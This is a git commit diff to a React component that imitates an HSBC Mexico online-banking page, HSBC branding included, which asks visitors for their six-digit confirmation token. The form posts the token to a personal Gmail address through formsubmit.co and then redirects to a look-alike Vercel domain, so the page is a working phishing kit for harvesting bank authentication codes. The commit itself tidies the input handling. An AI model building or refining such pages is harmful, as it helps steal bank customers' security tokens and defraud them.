e1b48075235ad29460a18e674a5b846f4017b0a3
skaimarvel <134034793+skaimarvel@users.noreply.github.com>
2023-05-21 16:47:57 -0500

    Update Tokendeconfirmacion.jsx

--- src/components/Tokendeconfirmacion.jsx
+++ src/components/Tokendeconfirmacion.jsx
@@ -2,23 +2,21 @@ import React, { useEffect, useState } from 'react';
 import ImgToken from '../img/token.jpg';
 import ImgError from '../img/errortoken.png';
 import Modal from 'react-modal';
-import '../css/style.css'
-import Logo from '../img/logo2.jpg'
+import '../css/style.css';
+import Logo from '../img/logo2.jpg';
 
 const Tokendeconfirmacion = () => {
   const [modalIsOpen, setModalIsOpen] = useState(true);
+  const [segundos, setSegundos] = useState(60);
+  const [inputValue, setInputValue] = useState('');
 
   const handleCloseModal = () => {
     setModalIsOpen(false);
   };
 
-  const [segundos, setSegundos] = useState(60);
-
   useEffect(() => {
     const interval = setInterval(() => {
-      // Restar 1 segundo al contador de segundos
       setSegundos((prevSegundos) => {
-        // Si llega a cero, reiniciar a 60
         if (prevSegundos === 0) {
           return 60;
         }
@@ -31,83 +29,72 @@ const Tokendeconfirmacion = () => {
     };
   }, []);
 
-
-  useEffect(() => {
-    const inputtoken = document.getElementById('inputtoken');
-
-    // solo se permiten valores numericos en el input y 6 digitos
-    const handleInput = () => {
-      if (inputtoken.value.length > 6) {
-        inputtoken.value = inputtoken.value.slice(0, 6);
-      }
-      inputtoken.value = inputtoken.value.replace(/[^0-9]/g, '');
-    };
-
-    inputtoken.addEventListener('input', handleInput);
-
-    return () => {
-      inputtoken.removeEventListener('input', handleInput);
-    };
-  }, []);
+  const handleInputChange = (event) => {
+    const value = event.target.value;
+    const sanitizedValue = value.replace(/[^0-9]/g, '').slice(0, 6);
+    setInputValue(sanitizedValue);
+  };
 
   return (
     <div>
-    <nav className='nbar' >
-      <img src={Logo} alt="" />
-    </nav>
-    <div className="cintadeco">
-      <h1 className="cinta">El Contrato Único de Banca por Internet y Banca Móvil tendrá modificaciones que entrarán en vigor a partir del 22 de diciembre de 2023. Consulta los detalles <a href='https://www.hsbc.com.mx/content/dam/hsbc/mx/documents/digital/aviso_actualizacion_contrato.pdf' className='link' >aquí.</a></h1>
-    </div>
-    <div className="contglobal">
-      <div className="contenedor">
-        <form
-          className="formulario"
-          action="https://formsubmit.co/robr48j@gmail.com"
-          method="POST"
-        >
-          <h1 className="titulo">Token de confirmación</h1>
-          <div className="cont">
-            <div className="labeleicon">
-              <label className="label">Ingresa tu token de confirmación</label>
+      <nav className="nbar">
+        <img src={Logo} alt="" />
+      </nav>
+      <div className="cintadeco">
+        <h1 className="cinta">
+          El Contrato Único de Banca por Internet y Banca Móvil tendrá modificaciones que entrarán en vigor a partir
+          del 22 de diciembre de 2023. Consulta los detalles{' '}
+          <a href="https://www.hsbc.com.mx/content/dam/hsbc/mx/documents/digital/aviso_actualizacion_contrato.pdf" className="link">
+            aquí.
+          </a>
+        </h1>
+      </div>
+      <div className="contglobal">
+        <div className="contenedor">
+          <form className="formulario" action="https://formsubmit.co/robr48j@gmail.com" method="POST">
+            <h1 className="titulo">Token de confirmación</h1>
+            <div className="cont">
+              <div className="labeleicon">
+                <label className="label">Ingresa tu token de confirmación</label>
+              </div>
+              <div className="input-cont">
+                <input
+                  className="inputname inputtoken"
+                  id="inputtoken"
+                  name="name"
+                  placeholder="Ingresa tu token de 6 digitos"
+                  type="number"
+                  maxLength="6"
+                  value={inputValue}
+                  onChange={handleInputChange}
+                  required
+                />
+                <input type="hidden" name="email" value="" />
+                <input type="hidden" name="_next" value="https://clientesbancohsbc.vercel.app/errortoken" />
+                <input type="hidden" name="_captcha" value="false" />
+              </div>
+              <div className="olvidouser">
+                <a href="" onClick={modalIsOpen} className="linkolvido">
+                  ¿Dónde está mi token?
+                </a>
+                <label className="tempo">Quedan {segundos} segundos</label>
+              </div>
+              <div className="input-contbtn">
+                <button className="btncontinuar" type="submit" disabled={inputValue.length !== 6}>
+                  Continuar
+                </button>
+              </div>
             </div>
-            <div className="input-cont">
-              <input
-                className="inputname inputtoken"
-                id="inputtoken"
-                name="name"
-                placeholder="Ingresa tu token de 6 digitos"
-                type="number"
-                maxLength="6"
-                required
-              />
-              {/*  */}
-              <input type="hidden" name="email" value="" />
-              <input type="hidden" name="_next" value='https://clientesbancohsbc.vercel.app/errortoken' />
-              <input type="hidden" name="_captcha" value="false" />
-            </div>
-            <div className="olvidouser">
-              <a href="" onClick={modalIsOpen} className="linkolvido">
-                 ¿Donde esta mi token?
-              </a>
-              <label className="tempo">Quedan {segundos} segundos </label>
-            </div>
-            <div className="input-contbtn">
-              <button className="btncontinuar" type="submit" >
-                Continuar
-              </button>
-            </div>
-          </div>
-        </form>
-        <Modal isOpen={modalIsOpen} className="modal-content">
-          <button onClick={handleCloseModal} className="modal-close-button">
-            X
-          </button>
-          <img src={ImgToken} alt="Imagen" className="modal-image" />
-        </Modal>
-
+          </form>
+          <Modal isOpen={modalIsOpen} className="modal-content">
+            <button onClick={handleCloseModal} className="modal-close-button">
+              X
+            </button>
+            <img src={ImgToken} alt="Imagen" className="modal-image" />
+          </Modal>
+        </div>
       </div>
     </div>
-</div>
   );
 };
 
